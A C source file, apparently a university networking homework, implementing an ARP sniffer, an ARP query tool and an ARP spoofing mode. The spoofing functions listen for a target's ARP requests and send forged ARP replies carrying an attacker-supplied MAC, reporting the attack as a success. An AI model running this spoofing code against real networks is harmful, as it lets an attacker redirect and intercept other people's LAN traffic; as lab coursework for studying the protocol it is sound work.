#include "arp.h"

#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h> //if_nametoindex
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h> // for open
#include <unistd.h> // for close
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

//----------------
void list_arp(char *argv[]);
void arp_preprocess(struct ether_addr *mac, struct in_addr *ip);
void print_arp(struct ether_arp *arp);
void arp_query(char *argv[]);
void pre_arp_spoofing(char *argv[]);
void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet);
void reply_arp_fake(struct ether_addr *mac, struct in_addr *ip);
void reply_packet(struct ether_addr *mac, struct ether_arp *pa, struct arp_packet *reply, struct sockaddr_ll *vt);
//----------------

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
//#define DEVICE_NAME "enp2s0f5"

#define DEVICE_NAME "ens33"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

//store fake MAC 
static char fmac[20];
 
int main(int argc, char *argv[])
{
	
	//get current user id, root -> 0
	uid_t uid = getuid();
		
	//check whether is superuser or not 
	if(uid!=0 )
		puts("ERROR: You must be root to use this tool!");
		
	else if(argc == 2 && strcmp(argv[1],"-h")==0)
	{
		Print_Format();
	}
	
	else if( argc == 3 )
	{
		if(strcmp(argv[1],"-l")==0)
		{
			list_arp(argv); // ./arp list -a or filter IP address
		}
		else if(strcmp(argv[1],"-q")==0)
		{
			puts("[    ARP query mode    ]"); // ./arp query IP address
			arp_query(argv);
		}
		else if(strlen(argv[1])==17 && strlen(argv[2])>=7)
		{
			puts("[   ARP spoofing mode   ]"); // ./arg fakeMAC target_IP_address
			pre_arp_spoofing(argv);
		}
		else
			printf("Format error !\nUsage: sudo %s -h for help\n",argv[0]);
	}
	else 
	{
		printf("Format error !\nUsage: sudo %s -h for help\n",argv[0]);
	}
	//struct in_addr myip;
	
	//clear recv/send buffer
	/*bzero(buffer_recv,sizeof(buffer_recv));

	//Fill the parameters of the sa.
	/*bzero(&sa, sizeof(sa));
	
	// Open a recv socket in data-link layer.

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */
	/*recvfrom(sockfd_recv,buffer_recv,sizeof(buffer_recv),0,(struct sockaddr*)&sa, &sa_len);

	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */
	
	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */
	/*sendto(sockfd_send,buffer_send,sizeof(buffer_send), 0, (struct sockaddr*)&sa, &sa_len);
	
*/
	return 0;
}

void list_arp(char *argv[])
{
	struct in_addr filter_ip;
	filter_ip.s_addr = inet_addr(argv[2]);
	// ./arp -l -a
	if(strcmp(argv[2], "-a") == 0)
	{
		puts("[   ARP sniffer mode  without filter IP   ]");
		arp_preprocess(NULL, NULL);
	}
	
	// check IP
	else if( filter_ip.s_addr > 0) 
	{
		puts("[   ARP sniffer mode  with filter IP ]");
		arp_preprocess(NULL, &filter_ip);	// ./arp list <target_ip_addr>
	}
	
	else
		Print_Format();
}

void print_arp(struct ether_arp *arp)
{
	char target_address[100], sender_address[100] ;
	char arp_info[100];
	
	bzero(arp_info,sizeof(arp_info));
	
	sprintf(arp_info,"Get arp packet - Who has %s?                   Tell %s\n",get_target_protocol_addr(arp, target_address),get_sender_protocol_addr(arp, sender_address));
	
	// print ./arp -l -a or filter_IP_address
	printf("%s",arp_info);
}
void arp_query(char *argv[])
{
	struct arp_packet query;
	struct ether_arp arp;
	struct sockaddr_ll sa;
	struct in_addr target_address;
	char packet[200];
	int sock_send, sock_recv, fd;
	char query_info[100], mac_info[100], get_ip[200], get_mac[200], info[100], query_ip[10];
	
	bzero(&sa,sizeof(sa));

	sock_recv = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	sock_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_RARP));
	if(sock_send <0 || sock_recv <0)
	{
		perror("ARP query socket error");
	}
	
	//strcpy(query_ip,argv[2]);
	inet_pton(AF_INET, argv[2], &target_address);
	
	memcpy(&query.eth_hdr.ether_dhost,"\xff\xff\xff\xff\xff\xff",ETH_ALEN); // query <- Destination MAC address
	memcpy(&query.eth_hdr.ether_shost, get_inf_mac(get_mac, DEVICE_NAME),ETH_ALEN);  // query <- Source MAC address
	
	query.eth_hdr.ether_type = htons(ETH_P_ARP); // set protocol type -> ARP (0x0806)
	
	// set as Ethernet
	set_hard_type(&query.arp, ARPHRD_ETHER); 
	// Ehternet length
	set_hard_size(&query.arp, ETH_ALEN);
	// IP        
	set_prot_type(&query.arp,ETHERTYPE_IP);
	// IP length       
	set_prot_size(&query.arp, IP_ALEN);
	//set ARP op code -> reply    
	set_op_code(&query.arp, ARPOP_REQUEST); 
	
	set_sender_hardware_addr(&query.arp, (get_inf_mac(get_mac,DEVICE_NAME)));
	set_sender_protocol_addr(&query.arp, (get_inf_ip(get_ip, DEVICE_NAME)));
	// unknown -> we wanna try to seek 
	set_target_hardware_addr(&query.arp, "\x00\x00\x00\x00\x00\x00");
	// set target pa  
	set_target_protocol_addr(&query.arp, (char *)&target_address);	
	
	// set sa
	sa.sll_family = AF_PACKET;
	sa.sll_ifindex = if_nametoindex(DEVICE_NAME);
	sa.sll_halen = ETH_ALEN;
	
	sendto(sock_send, &query, sizeof(query), 0,(struct sockaddr*)&sa, sizeof(sa));
	
	while(1)
	{
		bzero(&arp,sizeof(packet));
		read(sock_recv, &arp, sizeof(arp));
		
		if(memcmp(arp.arp_spa, &target_address,sizeof(arp.arp_tpa))==0) 
		{
			printf("MAC address of %s is %s\n", argv[2], get_sender_hardware_addr(&arp, query_info));
			break;
		}
	}
	close(sock_send);
	close(sock_recv);
}

/*void pre_arp_query(char *argv[])
{
	struct ehter_arp arp;
	struct in_addr query_ip;
	int sockfd;
	
	sockfd = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	strcpy(target_ip, argv[2]);
	
	if(sockfd <0)
	{
		perror("ARP query socket error");
	}
	
	while(1)
	{
		bzero(&arp,sizeof(arp));
		read(sockfd, &arp, sizeof(arp));
		if(memcmp(arp.arp_tpa, target_ip, sizeof(arp.arp_tpa)) ==0)
			arp_query(arp,target_ip);
	}
}*/

void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
{
	struct ether_arp arp;
	int sockfd;
	
	// AF , PF PACKET
	sockfd = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	
	
	if(sockfd <0)
	{
		perror("ARP list socket error");
	}
	
	while(1)
	{
		bzero(&arp,sizeof(arp));
		read(sockfd, &arp, sizeof(arp));
		
		// ./arp -l -a
		if(ip ==NULL)
		{
			print_arp(&arp);
		}
			
		else
		{
			if(memcmp(arp.arp_tpa, ip, sizeof(arp.arp_tpa)) ==0)
			{
			
				if(mac != NULL)
				{
					print_arp(&arp);
					arp_spoofing(mac, &arp); // ./arp <fake_mac_address> <target_ip_address>
				}	
				
				else
				{
					print_arp(&arp); //Print ./arp -l <filter_ip_address>
				}
			}
		}
	}
	close(sockfd);
}

void pre_arp_spoofing(char *argv[])
{
	struct in_addr target_ip;
	struct ether_addr *mac, reply;
	
	target_ip.s_addr = inet_addr(argv[2]);
	mac = ether_aton(argv[1]);
	strcpy(fmac,argv[1]);
	
	
	memcpy(&reply, mac, ETH_ALEN);
	
	if(target_ip.s_addr <0 )
	{
		Print_Format();
		exit(0);
	}
	
	if(mac == NULL)
	{
		Print_Format();
		exit(0);
	}
	
	arp_preprocess(&reply,&target_ip);
}

void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
{
	char arp_info[100];
	int sendfd;
	struct arp_packet rp;
	struct sockaddr_ll victim;
	
	//reply socket
	sendfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); 
	bzero(&victim, sizeof(victim));
	
	// set packet hardware 
	memcpy(&rp.eth_hdr.ether_dhost, packet->arp_sha, ETH_ALEN);
	memcpy(&rp.eth_hdr.ether_shost, fakemac, ETH_ALEN);
	rp.eth_hdr.ether_type = htons(ETH_P_ARP);
	
	// ethernet
	set_hard_type(&rp.arp, ARPHRD_ETHER); 
	// ehternet length
	set_hard_size(&rp.arp, ETH_ALEN); 
	// IP 
	set_prot_type(&rp.arp,ETHERTYPE_IP); 
	// IP length       
	set_prot_size(&rp.arp, IP_ALEN);  
	//set ARP op code -reply 
	set_op_code(&rp.arp, ARPOP_REPLY); 
	
	set_sender_hardware_addr(&rp.arp, (unsigned char *)fakemac);
	set_sender_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_tpa));
	set_target_hardware_addr(&rp.arp, (unsigned char *)(packet->arp_sha)); // set target hrd as orig sender hrd
	set_target_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_spa));	// set target pa as orig sender tpa
	
	// set 
	victim.sll_family = AF_PACKET;
	//another way to find interface index
	victim.sll_ifindex = if_nametoindex(DEVICE_NAME);
	//victim.sll_ifindex = getInterfaceByName(sendfd, DEVICE_NAME);
	victim.sll_halen = ETH_ALEN;
	memcpy(victim.sll_addr, fakemac, ETH_ALEN);
	
	// send arp reply
	sendto(sendfd, &rp, sizeof(rp), 0, (struct sockaddr *)&victim, sizeof(victim));
	
	if(sendfd < 0)
	{
		perror("arp spoofing sendfd error");
		exit(0);
	}
	printf("Sent ARP reply: %s is %s\n",get_target_protocol_addr(packet, arp_info),fmac);
	printf("ARP spoofing attack 'SUCCESS'!\n");
	close(sendfd);
	
}

